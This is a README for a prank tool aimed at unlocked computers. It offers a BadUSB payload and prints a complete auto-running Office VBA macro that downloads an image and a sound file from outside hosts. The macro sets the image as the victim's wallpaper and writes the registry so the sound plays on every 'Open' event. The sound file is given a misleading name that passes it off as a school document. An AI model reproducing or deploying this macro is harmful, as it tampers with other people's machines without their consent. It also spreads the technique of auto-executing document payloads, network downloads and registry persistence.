# Pony

someone left their computer unlocked

## Pony BadUSB

`payload.txt` can be used in a Rubber Ducky or Flipper Zero

## Uninstall

```powershell
Clear-ItemProperty -Path "HKCU:\AppEvents\Schemes\Apps\.Default\Open\.Current" -Name "(Default)"
```

## Pony Macro

These three references must be added

![Macro References](attachments/macro-references.png)

```vb
Option Explicit

Private Const SPI_SETDESKWALLPAPER = 20
Private Const SPIF_SENDWININICHANGE = &H2
Private Const SPIF_UPDATEINIFILE = &H1

Private Declare PtrSafe Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long

Sub AutoOpen()
    Pony
End Sub

Sub Document_Open()
    Pony
End Sub

Sub Pony()
    'converted from https://github.com/PolymorphicOpcode/pony
    Dim imageUrl As String, imagePath As String
    imageUrl = "https://wallpapers.com/images/featured/my-little-pony-x5ov0p26o9yzytsn.jpg"
    imagePath = Environ("USERPROFILE") & "\Downloads\mylittlepony.jpg"
    downloadFileFromURL imageUrl, imagePath
    SetWallpaper imagePath
    
    Dim soundUrl As String, soundPath As String
    soundUrl = "https://github.com/PolymorphicOpcode/troll/raw/main/my_little_pony.wav"
    soundPath = Environ("USERPROFILE") & "\Downloads\important_school_document.docx.wav"
    downloadFileFromURL soundUrl, soundPath

    'backslash and end of reg path is necessary to set (Default) value
    EditRegistry "HKCU\AppEvents\Schemes\Apps\.Default\Open\.Current\", soundPath
End Sub

Public Sub SetWallpaper(ByVal FileName As String)
'https://www.reddit.com/r/vba/comments/d8nwzg/sharing_vba_script_that_changes_desktop/
    Dim ret As Long
    ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, SPIF_SENDWININICHANGE Or SPIF_UPDATEINIFILE)

End Sub

Sub downloadFileFromURL(ByVal URL As String, ByVal FilePath As String)
    'https://simpleexcelvba.com/download-file-using-winhttp-adodb-method/
    Dim httpMethod As WinHttp.WinHttpRequest
    Set httpMethod = New WinHttp.WinHttpRequest
    
    httpMethod.Open "GET", URL, False
    httpMethod.Send
    
    ADODBmethod httpMethod, FilePath
End Sub

Sub ADODBmethod(ObjectWinHttp As Object, FileName As String)
    'https://simpleexcelvba.com/download-file-using-winhttp-adodb-method/
    Dim objADOStream As ADODB.Stream
    Set objADOStream = New ADODB.Stream
    
    objADOStream.Open
    objADOStream.Type = 1
    
    objADOStream.Write ObjectWinHttp.ResponseBody
    objADOStream.Position = 0
    
    Dim objFSO As Scripting.FileSystemObject
    Set objFSO = New Scripting.FileSystemObject
    
    objADOStream.SaveToFile FileName, 2
    objADOStream.Close
End Sub

Sub EditRegistry(ByVal name As String, ByVal value As String)
    'https://superuser.com/questions/578931/how-to-add-a-registry-key-using-vbscript
    Dim myWS As Object
    Set myWS = VBA.CreateObject("WScript.Shell")
    myWS.RegWrite name, value
End Sub
```

